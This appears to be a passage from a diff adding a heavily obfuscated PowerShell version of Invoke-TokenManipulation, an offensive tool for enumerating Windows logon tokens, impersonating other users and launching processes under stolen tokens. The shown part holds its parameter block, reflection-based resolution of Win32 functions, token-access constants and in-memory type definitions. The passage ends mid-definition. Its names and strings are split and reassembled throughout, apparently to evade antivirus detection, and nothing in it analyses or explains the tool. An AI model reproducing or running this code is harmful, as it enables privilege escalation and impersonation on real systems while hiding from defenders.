@@ -1,0 +1,1737 @@
+$y2D9Rz  =[Type]("{3}{2}{4}{8}{0}{6}{1}{5}{7}{9}" -f 'Tion.CalL','NGc','r','sYstEm.','e','oNv','I','E','fLeC','NtIOns') ;    &('SV') tej  ([TYPE]("{1}{0}{2}"-F 'pPd','a','OMAIN') )  ;   &('Sv') jx4dG (  [TYPE]("{8}{1}{3}{9}{7}{4}{6}{11}{0}{5}{2}{10}" -f'a','fL','s','EctiOn.','em','CCE','BlYbuiLdE','sS','SYsTeM.Re','emIT.A','S','r')) ;    $Vf41r2  =[TYpe]("{0}{11}{7}{10}{2}{12}{3}{9}{8}{1}{5}{6}{4}"-F'Sy','AT','E.','teRoPsERV','BUTe','t','RI','UNt','AS','ICes.maRsHAl','iM','sTeM.r','in') ;   &("{0}{2}{1}" -f'Se','iTEm','t-') VaRIAbLE:3yxSN  (  [TYPE]("{1}{0}" -f'nt32','UI')  ) ;    &("{2}{1}{0}" -f'M','eT-itE','s') VAriAble:1Cyl  ([Type]("{2}{0}{3}{1}"-f'T','r','BitcOnVer','E') )  ;&("{0}{1}{2}" -f 'set','-ItE','M')  ('v'+'AriABL'+'e:Nm'+'BVL') ( [tYpE]("{0}{1}" -F'STrI','NG') ) ;  &('sV') KAjtE (  [TyPE]("{6}{4}{5}{2}{3}{7}{0}{1}" -F 'iNteRoPSeRvICeS.','MARshAl','UNT','I','T','Em.R','sYS','me.') ) ;  &("{0}{1}"-f'Se','T') ('m'+'6Z')  ( [TYPE]("{4}{5}{3}{1}{0}{2}" -f'PAl.WiNdOw','Ty.prINcI','siDENTity','i','Se','cUR') ) ;    $9ZTqd =  [TYpe]("{3}{4}{1}{0}{2}" -F'Ce','ro','ss','SYSTeM','.diAGnostiCs.P');  &("{1}{0}{2}"-f'ET-IT','s','EM') vAriABLE:s2a  (  [TYpE]("{0}{1}" -f'In','Tptr') )  ;  function INv`oKe-TO`KenManip`U`L`At`ION
+{
+
+
+    [CmdletBinding(DefaultparametERsETname={"{2}{0}{1}"-f 'a','te','Enumer'})]
+    Param(
+        [Parameter(PAraMeTErSeTnamE = "e`NUMEra`TE")]
+        [Switch]
+        ${EN`Um`er`ATe},
+
+        [Parameter(PArAMeteRsetnAMe = "R`eVtoself")]
+        [Switch]
+        ${rE`V`T`oSElf},
+
+        [Parameter(ParaMeTeRsetnAmE = "shO`w`AlL")]
+        [Switch]
+        ${ShO`w`ALL},
+
+        [Parameter(parAMETeRSetNAmE = "iM`PeRSO`NA`TE`UseR")]
+        [Switch]
+        ${IMP`E`RsoN`AT`EUser},
+
+        [Parameter(ParaMETErsETnaMe = "Cr`e`A`TEprOCesS")]
+        [String]
+        ${CR`EatepROC`E`Ss},
+
+        [Parameter(pArameTerSetNAMe = "w`hOamI")]
+        [Switch]
+        ${w`hoa`Mi},
+
+        [Parameter(pARAMEterSEtnAMe = "ImPeRSON`ATe`U`sEr")]
+        [Parameter(PaRaMEterSetNAMe = "cR`EAT`Epr`o`CEsS")]
+        [String]
+        ${U`seRn`AMe},
+
+        [Parameter(ParaMEteRSetnAMe = "ImPEr`SoNATE`USer")]
+        [Parameter(PARAmETERSeTnaMe = "CrEatePR`oc`eSS")]
+        [Int]
+        ${P`RoCESS`iD},
+
+        [Parameter(PaRAMEterSETNamE = "imP`Erson`ATEu`Ser", VaLuefRoMPiPELiNe=${tr`Ue})]
+        [Parameter(PaRamETeRSeTName = "cReAtE`pr`oC`ess", VALUEfROMpipELInE=${tR`UE})]
+        [System.Diagnostics.Process]
+        ${pR`oCEsS},
+
+        [Parameter(PAramEteRSeTName = "iM`PERSonATEU`S`eR")]
+        [Parameter(PArAMETerSETnAMe = "cR`EaTe`PrO`cEss")]
+        ${tHR`EaD`id},
+
+        [Parameter(pARAmETersEtNaME = "crE`ATepRoC`e`sS")]
+        [String]
+        ${PROcesSA`R`gs},
+
+        [Parameter(paRaMEtERsEtNAmE = "Cr`e`AtepROce`ss")]
+        [Switch]
+        ${NO`Ui},
+
+        [Parameter(PArametERseTnAMe = "C`REATEPrO`C`ESs")]
+        [Switch]
+        ${paSst`H`Ru}
+    )
+   
+    &("{0}{1}{2}" -f'Set-','Strict','Mode') -Version 2
+
+	
+	Function GE`T-DeLe`gaTEty`pe
+	{
+	    Param
+	    (
+	        [OutputType([Type])]
+	        
+	        [Parameter( pOsITION = 0)]
+	        [Type[]]
+	        ${PA`R`AM`ETerS} = (&("{2}{0}{1}"-f'c','t','New-Obje') ("{0}{1}"-f 'Typ','e[]')(0)),
+	        
+	        [Parameter( poSitiON = 1 )]
+	        [Type]
+	        ${R`et`UrNT`ypE} = [Void]
+	    )
+
+	    ${DOMA`In} =   (&("{3}{0}{2}{1}" -f'-','Le','VarIAb','get') ("tE"+"J") )."v`ALuE"::"CURr`ENtDo`MAin"
+	    ${dYN`As`Se`MblY} = &("{0}{1}{2}" -f'New-O','bje','ct') ("{1}{6}{0}{5}{2}{3}{4}"-f 'stem.R','S','ion.As','s','emblyName','eflect','y')(("{0}{1}{3}{2}{5}{4}"-f 'Ref','lect','De','ed','gate','le'))
+	    ${aSSEmBl`Y`BU`ILdER} = ${D`om`AIN}.("{1}{2}{5}{3}{6}{4}{0}" -f'y','DefineDy','nami','s','l','cAs','emb').Invoke(${dy`NA`SseM`Bly},   $jX4DG::"R`Un")
+	    ${mODUle`B`U`ILDeR} = ${A`s`sEMBLYBuI`lD`er}.("{4}{2}{0}{3}{5}{1}" -f'eDynamicMo','e','in','du','Def','l').Invoke(("{3}{2}{4}{0}{1}" -f 'M','odule','nMemor','I','y'), ${FAl`Se})
+	    ${tYP`eB`UI`lDEr} = ${mOdU`lebU`ild`ER}.("{2}{0}{1}"-f 'y','pe','DefineT').Invoke(("{3}{2}{1}{4}{0}"-f'eType','eg','Del','My','at'), ("{2}{4}{9}{5}{1}{8}{3}{0}{6}{7}" -f'ss, A',', ','Class, Pub','la','l','ealed','ut','oClass','AnsiC','ic, S'), [System.MulticastDelegate])
+	    ${cOns`Tr`U`CtoRbui`lder} = ${ty`PEB`Uil`Der}.("{2}{1}{3}{0}"-f 'ctor','ineCons','Def','tru').Invoke(("{6}{4}{2}{1}{3}{0}{5}" -f'eBy',' ',',','Hid','e','Sig, Public','RTSpecialNam'),   $y2D9rz::"S`TaND`ArD", ${PARAMET`E`RS})
+	    ${CONSTR`Uc`TORBuI`l`deR}.("{0}{2}{3}{1}{4}"-f'Set','ati','Implemen','t','onFlags').Invoke(("{0}{3}{4}{2}{1}" -f 'Runti','naged','a','me',', M'))
+	    ${m`EthOdb`UI`lDer} = ${Ty`pEbuiL`DER}.("{0}{2}{1}{3}" -f 'D','t','efineMe','hod').Invoke('Invoke', ("{4}{3}{2}{8}{5}{0}{1}{7}{6}"-f 'lo','t','g, N',' HideBySi','Public,','S','al',', Virtu','ew'), ${r`ETUr`NTyPe}, ${PaRa`Me`TERs})
+	    ${mET`H`O`DB`UiLder}.("{2}{1}{4}{0}{3}{5}"-f 'eme','tIm','Se','ntationFl','pl','ags').Invoke(("{0}{3}{1}{2}{4}" -f 'Ru','i','me, Manag','nt','ed'))
+	    
+	    &("{3}{0}{2}{1}"-f 't','-Output','e','Wri') ${t`YPe`BU`ILDeR}.("{0}{2}{1}{3}" -f 'C','te','rea','Type').Invoke()
+	}
+
+
+	
+	Function gE`T-p`R`ocAddrEsS
+	{
+	    Param
+	    (
+	        [OutputType([IntPtr])]
+	    
+	        [Parameter( pOSitioN = 0, manDAtorY = ${t`RUE} )]
+	        [String]
+	        ${moD`Ule},
+	        
+	        [Parameter( pOsITiON = 1, maNDaToRY = ${tr`UE} )]
+	        [String]
+	        ${pR`O`ceDUre}
+	    )
+
+	    
+	    ${SY`STEMaS`S`EMBLY} =  ( &("{1}{0}"-f'ir','D')  VaRiabLe:tej)."val`UE"::"cU`Rre`NTDOm`AIN".("{2}{1}{3}{0}{4}"-f'l','s','GetAs','emb','ies').Invoke() |
+	        &("{3}{2}{0}{1}" -f'Objec','t','here-','W') { ${_}."GlO`B`A`LAs`sEMbLyc`A`cHe" -And ${_}."Lo`cAti`on".("{0}{1}"-f'Spl','it').Invoke('\\')[-1].("{0}{1}{2}"-f 'E','qu','als').Invoke(("{2}{1}{0}" -f 'll','ystem.d','S')) }
+	    ${u`Ns`A`FENA`TiV`EMETHods} = ${sYstEMASS`e`m`Bly}.("{0}{1}{2}"-f 'Get','Ty','pe').Invoke(("{9}{8}{0}{7}{6}{5}{2}{1}{3}{4}" -f'c','eNativeM','Unsaf','et','hods','.','oft.Win32','ros','i','M'))
+	    
+	    ${GETM`o`d`ULeHANdle} = ${u`NsAfEna`TiV`eMeT`H`ODS}.("{0}{1}" -f 'GetMeth','od').Invoke(("{2}{3}{1}{0}" -f'ndle','oduleHa','Ge','tM'))
+	    ${gETprO`c`ADdrEsS} = ${u`NsA`F`E`NaTI`VEMETHO`ds}.("{0}{2}{1}"-f 'G','d','etMetho').Invoke(("{3}{2}{1}{0}" -f 's','cAddres','ro','GetP'))
+	    
+	    ${Ke`R`N32`hAN`dLE} = ${G`etmO`dUl`eHAnDLe}."INv`oKe"(${nU`Ll}, @(${Mo`dule}))
+	    ${tmp`pTr} = &("{1}{0}{2}{3}" -f 'ew','N','-Ob','ject') ("{0}{1}"-f'In','tPtr')
+	    ${hA`NdLe`Ref} = &("{1}{0}{2}" -f'jec','New-Ob','t') ("{7}{8}{3}{0}{2}{6}{1}{5}{9}{4}"-f'I','ices.Ha','nter','Runtime.','f','ndl','opServ','S','ystem.','eRe')(${Tmp`P`Tr}, ${KE`RN32`HaN`dLE})
+
+	    
+	    &("{3}{0}{1}{2}" -f 'O','utp','ut','Write-') ${GEt`Pro`CadD`ReSs}."InV`O`ke"(${n`UlL}, @([System.Runtime.InteropServices.HandleRef]${hANdl`e`R`EF}, ${p`Ro`C`edURE}))
+	}
+
+    
+    
+    
+    ${Co`Nsta`NtS} = @{
+        ("{2}{4}{1}{0}{3}" -f 'R','ECU','ACCESS_SYSTEM','ITY','_S') = 0x01000000
+        ("{2}{0}{3}{1}" -f'O','OL','READ_C','NTR') = 0x00020000
+        ("{3}{0}{1}{2}" -f'HR','O','NIZE','SYNC') = 0x00100000
+        ("{1}{0}{3}{2}" -f'NDAR','STA','TS_ALL','D_RIGH') = 0x001F0000
+        ("{1}{0}{2}" -f 'OK','T','EN_QUERY') = 8
+        ("{0}{6}{3}{2}{5}{1}{4}" -f'TOKEN_A','G','ST_PRIVI','U','ES','LE','DJ') = 0x20
+        ("{3}{1}{0}{2}{4}" -f 'RO','R','R_NO_T','E','OKEN') = 0x3f0
+        ("{4}{3}{5}{1}{0}{2}" -f'GAT','E','ION','URITY_DE','SEC','L') = 3
+        ("{7}{4}{3}{1}{0}{6}{5}{2}" -f'_IN','Y','ON','RIT','ECU','RMATI','FO','DACL_S') = 0x4
+        ("{3}{0}{2}{1}{4}"-f 'SS_ALLOWED_','_TY','ACE','ACCE','PE') = 0x0
+        ("{4}{1}{0}{3}{5}{2}"-f 'IGHTS_','RD_R','UIRED','RE','STANDA','Q') = 0x000F0000
+        ("{3}{1}{0}{2}" -f 'O','ESKT','P_GENERIC_ALL','D') = 0x000F01FF
+        ("{1}{2}{0}"-f'E_DAC','WRI','T') = 0x00040000
+        ("{3}{1}{0}{2}"-f 'AC','ECT_INHERIT_','E','OBJ') = 0x1
+        ("{2}{1}{3}{0}"-f 'CCESS','_','GRANT','A') = 0x1
+        ("{1}{0}{3}{2}" -f 'RUSTEE_I','T','_NAME','S') = 0x1
+        ("{1}{3}{2}{0}" -f 'ID','TRUS','E_IS_S','TE') = 0x0
+        ("{3}{1}{0}{2}" -f'E','_US','R','TRUSTEE_IS') = 0x1
+        ("{6}{5}{0}{4}{3}{2}{1}"-f'I','OUP','N_GR','ELL_KNOW','S_W','USTEE_','TR') = 0x5
+        ("{4}{2}{1}{3}{0}" -f 'P','STEE_IS_G','U','ROU','TR') = 0x2
+        ("{4}{2}{0}{3}{1}"-f '_INFORMA','N','S_QUERY','TIO','PROCES') = 0x400
+        ("{1}{3}{0}{2}{4}"-f 'SSIGN_PR','TO','IMA','KEN_A','RY') = 0x1
+        ("{4}{3}{0}{2}{1}" -f 'CA','E','T','PLI','TOKEN_DU') = 0x2
+        ("{4}{3}{0}{1}{2}" -f'KEN_','IMPERSO','NATE','O','T') = 0x4
+        ("{1}{2}{4}{3}{0}"-f 'OURCE','TO','KEN','Y_S','_QUER') = 0x10
+        ("{2}{1}{4}{0}{3}"-f'HT','RD_','STANDA','S_READ','RIG') = 0x20000
+        ("{1}{0}{2}{4}{3}"-f'is','TokenStat','t','s','ic') = 10
+        ("{1}{3}{0}{2}" -f 'CCE','TOKE','SS','N_ALL_A') = 0xf01ff
+        ("{3}{0}{1}{2}" -f 'M_','ALLOWE','D','MAXIMU') = 0x02000000
+        ("{0}{1}{2}{3}"-f 'TH','READ_AL','L_ACCES','S') = 0x1f03ff
+        ("{0}{4}{5}{6}{1}{3}{2}" -f'E','_PARA','ER','MET','RROR_I','NV','ALID') = 0x57
+        ("{0}{1}{4}{3}{2}"-f'LOG','ON_','Y','LS_ONL','NETCREDENTIA') = 0x2
+        ("{4}{1}{5}{0}{3}{2}" -f'L','IVILEGE','D','E','SE_PR','_ENAB') = 0x2
+        ("{1}{7}{6}{3}{4}{2}{5}{0}"-f 'ULT','SE_PR','D_BY_D','NABL','E','EFA','_E','IVILEGE') = 0x1
+        ("{3}{4}{1}{0}{2}"-f 'MOV','_PRIVILEGE_RE','ED','S','E') = 0x4
+    }
+
+    ${W`In32con`st`ANts} = &("{1}{0}{2}"-f'w-Obj','Ne','ect') ("{0}{1}"-f'PSObje','ct') -Property ${c`oNS`TaNTs}
+    
+
+
+    
+    
+    
+	
+	
+	${doM`A`iN} =   (  &('Gi')  vArIabLE:TEj )."VA`LUE"::"CURREN`T`DO`m`Ain"
+	${d`yna`MicAsS`EMBlY} = &("{2}{0}{1}{3}" -f 'e','c','New-Obj','t') ("{6}{4}{2}{1}{3}{8}{5}{7}{0}" -f 'me','fl','em.Re','ect','yst','.Assemb','S','lyNa','ion')(("{2}{3}{0}{1}"-f 'cAssem','bly','D','ynami'))
+	${aSsEMb`LyBu`il`d`ER} = ${D`o`mAin}.("{2}{3}{4}{0}{5}{1}{6}" -f 'ynam','Asse','Def','ine','D','ic','mbly').Invoke(${d`YnaM`ICasseM`BLy},  $Jx4dG::"r`UN")
+	${M`oduL`EB`UilDEr} = ${ass`EMBly`BU`ilDeR}.("{3}{2}{0}{1}"-f'Modul','e','namic','DefineDy').Invoke(("{3}{1}{2}{0}"-f 'ule','a','micMod','Dyn'), ${fA`L`SE})
+	${c`O`NstrUcto`RiNfo} =  $Vf41r2.("{1}{0}{4}{2}{3}" -f 'etCon','G','r','s','structo').Invoke()[0]
+
+    
+	${T`YPeBu`ild`er} = ${M`ODulEbuIl`d`er}.("{1}{0}{2}" -f'En','Define','um').Invoke(("{1}{4}{3}{0}{2}"-f'NFORMATI','TO','ON_CLASS','I','KEN_'), ("{1}{0}"-f'c','Publi'), [UInt32])
+	${T`YPe`BUiL`DEr}.("{3}{2}{1}{0}" -f 'Literal','ine','ef','D').Invoke(("{1}{2}{0}"-f 'r','Tok','enUse'), [UInt32] 1) | &("{2}{1}{0}" -f'll','t-Nu','Ou')
+    ${tYpeBuI`L`DeR}.("{1}{0}{2}"-f 'fi','De','neLiteral').Invoke(("{3}{2}{1}{0}"-f 'ps','ou','okenGr','T'), [UInt32] 2) | &("{2}{0}{1}"-f'ut-N','ull','O')
+    ${tyPEB`Ui`ld`ER}.("{3}{1}{0}{2}" -f'er','ineLit','al','Def').Invoke(("{0}{2}{1}{3}" -f'T','enPrivil','ok','eges'), [UInt32] 3) | &("{1}{0}{2}" -f 'l','Out-Nu','l')
+    ${Typ`eBU`ILDer}.("{1}{2}{0}"-f'iteral','Defin','eL').Invoke(("{2}{1}{0}"-f 'ner','nOw','Toke'), [UInt32] 4) | &("{0}{2}{1}"-f'Out-','ull','N')
+    ${TyP`eBuiL`d`ER}.("{3}{0}{4}{2}{1}" -f 'i','teral','i','Def','neL').Invoke(("{3}{1}{0}{2}"-f 'n','oke','PrimaryGroup','T'), [UInt32] 5) | &("{1}{0}{2}"-f 'ut','O','-Null')
+    ${Ty`P`ebUI`ldEr}.("{1}{3}{0}{2}" -f 'er','Define','al','Lit').Invoke(("{4}{1}{2}{3}{0}" -f 'l','okenDefau','ltDa','c','T'), [UInt32] 6) | &("{1}{2}{0}" -f'ull','Out-','N')
+    ${TyPEbUil`d`eR}.("{1}{0}{2}{3}" -f'fi','De','ne','Literal').Invoke(("{2}{1}{3}{0}" -f 'rce','okenS','T','ou'), [UInt32] 7) | &("{1}{0}" -f 'ull','Out-N')
+    ${TYPebU`iLD`Er}.("{3}{0}{2}{1}" -f'efin','teral','eLi','D').Invoke(("{0}{1}"-f 'Toke','nType'), [UInt32] 8) | &("{0}{1}{2}"-f 'O','ut-Nul','l')
+    ${tY`PebuI`Ld`eR}.("{1}{0}{2}{3}"-f 'i','DefineL','ter','al').Invoke(("{1}{4}{0}{3}{2}" -f 'onL','TokenImperso','el','ev','nati'), [UInt32] 9) | &("{0}{2}{1}"-f 'Out-N','l','ul')
+    ${t`YpeBuIl`D`eR}.("{2}{0}{1}"-f 'Liter','al','Define').Invoke(("{3}{1}{4}{0}{2}" -f'stic','ken','s','To','Stati'), [UInt32] 10) | &("{0}{2}{1}" -f'O','Null','ut-')
+    ${typE`BU`I`lDer}.("{2}{0}{1}"-f'Lit','eral','Define').Invoke(("{0}{3}{1}{5}{4}{2}" -f 'Tok','nRe','tedSids','e','ric','st'), [UInt32] 11) | &("{2}{1}{0}"-f 'll','ut-Nu','O')
+    ${tYPEBUI`L`dEr}.("{2}{3}{0}{1}" -f 'iter','al','Defi','neL').Invoke(("{3}{0}{2}{1}"-f'okenSes','ionId','s','T'), [UInt32] 12) | &("{1}{0}" -f 'ut-Null','O')
+    ${TY`PEB`UilD`eR}.("{3}{1}{2}{0}"-f 'l','in','eLitera','Def').Invoke(("{1}{4}{6}{0}{2}{5}{3}" -f 'enGro','T','up','ndPrivileges','o','sA','k'), [UInt32] 13) | &("{1}{0}" -f'Null','Out-')
+    ${ty`pEbU`ilDer}.("{2}{1}{0}" -f'teral','eLi','Defin').Invoke(("{4}{3}{0}{1}{2}"-f'r','enc','e','enSessionRefe','Tok'), [UInt32] 14) | &("{1}{0}{2}"-f 'ut-','O','Null')
+    ${T`yPEb`UiLDer}.("{2}{0}{1}{3}"-f 'neL','itera','Defi','l').Invoke(("{4}{1}{0}{3}{2}"-f'Bo','Sand','rt','xIne','Token'), [UInt32] 15) | &("{1}{0}"-f 'ut-Null','O')
+    ${T`yPE`BUIL`DER}.("{1}{2}{0}{3}{4}"-f 'n','D','efi','e','Literal').Invoke(("{3}{0}{1}{2}" -f 'enAudi','t','Policy','Tok'), [UInt32] 16) | &("{0}{1}{2}" -f'Ou','t-Nu','ll')
+    ${typ`e`BUiLD`Er}.("{1}{2}{3}{0}"-f 'Literal','De','fin','e').Invoke(("{1}{0}{2}"-f'oke','T','nOrigin'), [UInt32] 17) | &("{0}{2}{1}" -f'Out','ll','-Nu')
+    ${TY`p`EbuIldEr}.("{0}{1}{2}"-f 'De','fin','eLiteral').Invoke(("{3}{1}{0}{2}" -f'onTy','ti','pe','TokenEleva'), [UInt32] 18) | &("{0}{1}" -f 'Out-Nu','ll')
+    ${ty`pEB`Uil`dEr}.("{3}{2}{1}{0}"-f 'eral','eLit','in','Def').Invoke(("{1}{2}{0}{3}{4}"-f 'inkedT','Toke','nL','ok','en'), [UInt32] 19) | &("{0}{1}{2}" -f 'Ou','t-Nul','l')
+    ${typ`E`BuILdeR}.("{3}{1}{2}{0}" -f 'ral','e','Lite','Defin').Invoke(("{0}{2}{3}{1}" -f 'To','ation','kenEl','ev'), [UInt32] 20) | &("{0}{1}"-f 'O','ut-Null')
+    ${TYpe`B`Ui`lDeR}.("{0}{4}{3}{1}{2}" -f'Defi','r','al','te','neLi').Invoke(("{0}{2}{1}{3}" -f 'TokenH','t','asRestric','ions'), [UInt32] 21) | &("{0}{1}{2}"-f 'Out-','Nul','l')
+    ${ty`P`ebUIl`DER}.("{2}{0}{4}{3}{1}"-f'fineLi','al','De','r','te').Invoke(("{0}{1}{5}{6}{3}{2}{4}" -f'Toke','nAcces','ma','r','tion','sInf','o'), [UInt32] 22) | &("{2}{1}{0}"-f'ull','-N','Out')
+    ${tyP`EBu`IlD`Er}.("{2}{1}{3}{0}"-f'al','fineL','De','iter').Invoke(("{2}{7}{0}{4}{5}{1}{6}{3}" -f 'Virtua','tion','To','lowed','liz','a','Al','ken'), [UInt32] 23) | &("{1}{2}{0}" -f 'll','O','ut-Nu')
+    ${TYPe`Bui`Ld`er}.("{4}{1}{2}{3}{0}"-f'al','f','ineLite','r','De').Invoke(("{0}{1}{2}{3}{4}" -f'TokenVirtu','al','izati','onEnable','d'), [UInt32] 24) | &("{0}{1}{2}" -f 'Ou','t-Nu','ll')
+    ${t`yPEbUild`eR}.("{3}{2}{0}{1}" -f 'itera','l','efineL','D').Invoke(("{0}{3}{2}{4}{1}"-f 'T','vel','In','oken','tegrityLe'), [UInt32] 25) | &("{2}{1}{0}" -f 'll','-Nu','Out')
+    ${tY`peBuIl`D`ER}.("{2}{1}{0}"-f'l','era','DefineLit').Invoke(("{0}{2}{1}"-f 'To','ess','kenUIAcc'), [UInt32] 26) | &("{2}{1}{0}"-f 'll','ut-Nu','O')
+    ${T`YPE`BU`iLDER}.("{3}{1}{0}{2}"-f 'te','i','ral','DefineL').Invoke(("{1}{0}{2}{4}{3}"-f'nMand','Toke','ato','olicy','ryP'), [UInt32] 27) | &("{1}{0}{2}" -f'ut-Nu','O','ll')
+    ${tY`pE`BU`ILdEr}.("{3}{1}{2}{0}"-f 'al','fineLi','ter','De').Invoke(("{0}{1}{3}{2}" -f 'T','oken','Sid','Logon'), [UInt32] 28) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
+    ${t`yP`ebUIld`er}.("{2}{1}{0}"-f 'al','er','DefineLit').Invoke(("{5}{1}{4}{2}{3}{0}" -f'ner','enIsA','n','tai','ppCo','Tok'), [UInt32] 29) | &("{1}{0}{2}"-f'Nul','Out-','l')
+    ${typEB`UI`LDEr}.("{1}{2}{4}{0}{3}" -f'er','Defi','neLi','al','t').Invoke(("{0}{2}{1}{3}"-f'T','Capabilit','oken','ies'), [UInt32] 30) | &("{2}{1}{0}"-f 'll','ut-Nu','O')
+    ${ty`p`E`BUilDER}.("{4}{0}{2}{1}{3}"-f 'ef','neLi','i','teral','D').Invoke(("{5}{1}{2}{3}{0}{4}" -f'i','nta','in','erS','d','TokenAppCo'), [UInt32] 31) | &("{2}{1}{0}" -f 'ull','t-N','Ou')
+    ${tyPEbU`i`ld`er}.("{1}{2}{3}{0}" -f'al','Defin','eLit','er').Invoke(("{6}{4}{1}{0}{3}{2}{5}" -f 'nta','AppCo','Numb','iner','n','er','Toke'), [UInt32] 32) | &("{0}{1}{2}"-f 'O','ut','-Null')
+    ${T`YpeB`Uil`dEr}.("{1}{0}{2}{3}"-f'fineLite','De','r','al').Invoke(("{4}{7}{1}{5}{0}{6}{3}{2}" -f'l','enUse','es','tribut','To','rC','aimAt','k'), [UInt32] 33) | &("{1}{0}{2}" -f 'ut-Nul','O','l')
+    ${tYpEBuI`l`D`ER}.("{0}{1}{2}{3}" -f 'D','efi','neLite','ral').Invoke(("{2}{0}{4}{1}{5}{3}{6}"-f'evice','imA','TokenD','r','Cla','tt','ibutes'), [UInt32] 34) | &("{2}{0}{1}" -f '-Nul','l','Out')
+    ${tyPe`B`Ui`ldEr}.("{1}{2}{0}" -f 'neLiteral','De','fi').Invoke(("{2}{6}{5}{1}{4}{0}{3}{7}" -f 't','Use','Tok','tri','rClaimA','tricted','enRes','butes'), [UInt32] 35) | &("{0}{2}{1}" -f 'Ou','l','t-Nul')
+    ${tYpe`B`Ui`LdER}.("{1}{3}{2}{0}"-f 'ineLiteral','D','f','e').Invoke(("{4}{7}{2}{8}{1}{10}{9}{3}{6}{5}{0}" -f 's','l','rictedDe','tt','TokenRes','ibute','r','t','viceC','imA','a'), [UInt32] 36) | &("{0}{1}"-f'O','ut-Null')
+    ${T`YP`eBuiLdEr}.("{3}{0}{4}{1}{2}" -f'ine','ite','ral','Def','L').Invoke(("{1}{5}{3}{2}{4}{0}"-f'roups','T','ev','nD','iceG','oke'), [UInt32] 37) | &("{0}{1}{2}"-f 'O','u','t-Null')
+    ${t`YPeBUiL`D`Er}.("{0}{1}{2}" -f'De','fineLitera','l').Invoke(("{3}{1}{0}{2}{4}" -f'e','trict','dD','TokenRes','eviceGroups'), [UInt32] 38) | &("{1}{0}" -f'ut-Null','O')
+    ${TyP`EbuI`Ld`er}.("{3}{2}{1}{0}"-f'iteral','eL','efin','D').Invoke(("{4}{1}{0}{2}{3}" -f'Secu','ken','rityAttrib','utes','To'), [UInt32] 39) | &("{2}{0}{1}" -f't-N','ull','Ou')
+    ${TYPE`Bu`IldER}.("{3}{1}{4}{2}{0}" -f'teral','f','i','De','ineL').Invoke(("{0}{2}{1}{3}"-f'Tok','icte','enIsRestr','d'), [UInt32] 40) | &("{2}{1}{0}" -f'ull','ut-N','O')
+    ${typEbU`IL`dER}.("{4}{3}{0}{2}{1}"-f 'i','eLiteral','n','ef','D').Invoke(("{1}{2}{4}{0}{3}"-f 'kenIn','Max','T','foClass','o'), [UInt32] 41) | &("{0}{2}{1}"-f'Out','ull','-N')
+	${T`okEn_`iNFO`RMAt`IOn_c`L`A`Ss} = ${TY`p`ebuI`LDeR}.("{2}{0}{1}"-f'eTy','pe','Creat').Invoke()
+
+    
+    ${attRI`BU`TES} = ("{13}{11}{5}{2}{3}{0}{12}{9}{8}{6}{10}{7}{4}{1}"-f'c, S','t','ss, C','lass, Publi','reFieldIni',', AnsiCla','yout, Seale','fo','alLa','enti','d, Be','toLayout','equ','Au')
+	${tYpEBU`I`L`dEr} = ${MoDULeB`U`il`der}.("{0}{3}{2}{1}"-f 'D','pe','eTy','efin').Invoke(("{3}{0}{2}{1}" -f'E_IN','R','TEGE','LARG'), ${ATT`RibUt`es}, [System.ValueType], 8)
+	${tYPeb`U`il`DeR}.("{2}{0}{1}" -f'el','d','DefineFi').Invoke(("{0}{1}" -f'LowPa','rt'), [UInt32], ("{1}{0}"-f'ic','Publ')) | &("{0}{1}{2}" -f 'Ou','t','-Null')
+	${ty`peBu`IlD`ER}.("{0}{1}{3}{2}"-f'D','efine','d','Fiel').Invoke(("{1}{2}{0}"-f 'hPart','Hi','g'), [UInt32], ("{2}{1}{0}" -f'lic','ub','P')) | &("{0}{2}{1}"-f 'Out-N','l','ul')
+	${L`ARgE_In`Teg`Er} = ${TYpEBUi`ld`er}.("{2}{0}{1}"-f'teT','ype','Crea').Invoke()
+
+    
+    ${aTT`R`IBUTES} = ("{15}{9}{12}{21}{1}{20}{11}{2}{5}{3}{10}{6}{7}{4}{19}{13}{16}{18}{14}{0}{17}{8}" -f 'i','Layout, ','lass, C','ass, P','out','l','ic, SequentialL','ay','t','u','ubl','siC','t',' Se',' BeforeF','A','al','eldIni','ed,',',','An','o')
+	${T`Y`pEbU`IlDeR} = ${M`odULeb`UIL`D`er}.("{1}{0}{2}" -f'efi','D','neType').Invoke(("{1}{0}"-f 'D','LUI'), ${attr`i`Butes}, [System.ValueType], 8)
+	${ty`p`ebu`ildeR}.("{0}{2}{1}"-f'D','ineField','ef').Invoke(("{0}{1}{2}" -f 'LowP','a','rt'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{2}{0}{1}" -f'ut-Nul','l','O')
+	${Ty`p`ebuIl`DER}.("{0}{1}{2}" -f 'Def','ineF','ield').Invoke(("{0}{1}{2}" -f'Hi','gh','Part'), [Int32], ("{2}{1}{0}" -f 'ic','bl','Pu')) | &("{1}{0}{2}"-f 'Nu','Out-','ll')
+	${lu`id} = ${TYPe`B`UIlD`Er}.("{1}{0}{2}" -f 'r','C','eateType').Invoke()
+
+    
+    ${atT`RI`Bu`Tes} = ("{14}{5}{17}{1}{3}{16}{11}{4}{7}{0}{2}{15}{6}{13}{18}{12}{10}{8}{9}" -f 'c, Se','you','quentialLa','t','ss, ','uto','ut, Se','Class, Publi','dI','nit','l','la','Fie','aled, Be','A','yo',', AnsiC','La','fore')
+	${t`Y`PebUil`DeR} = ${MOd`ULeb`UI`L`DEr}.("{2}{3}{0}{1}" -f'y','pe','D','efineT').Invoke(("{3}{1}{2}{0}{4}"-f 'C','K','EN_STATISTI','TO','S'), ${atTr`ibu`TEs}, [System.ValueType])
+	${tY`PeBu`Il`dEr}.("{1}{0}{2}" -f 'efin','D','eField').Invoke(("{2}{0}{1}"-f 'e','nId','Tok'), ${lU`id}, ("{0}{1}"-f'Pub','lic')) | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
+	${tYP`e`BUiLd`Er}.("{0}{1}{3}{2}" -f'Defin','eFi','ld','e').Invoke(("{2}{0}{3}{1}{4}"-f'u','e','A','th','nticationId'), ${L`Uid}, ("{1}{0}" -f 'blic','Pu')) | &("{0}{1}" -f'Out-','Null')
+    ${TyP`Eb`UI`LDEr}.("{2}{0}{1}"-f 'i','eld','DefineF').Invoke(("{1}{0}{2}"-f 't','Expira','ionTime'), ${largE`_I`NTeG`eR}, ("{1}{0}{2}" -f'ub','P','lic')) | &("{1}{2}{0}"-f 'll','Ou','t-Nu')
+    ${t`y`pEB`UILDER}.("{0}{1}{2}"-f 'Def','i','neField').Invoke(("{2}{1}{0}{3}" -f 'enTyp','ok','T','e'), [UInt32], ("{1}{2}{0}" -f'c','P','ubli')) | &("{0}{1}" -f'Out-N','ull')
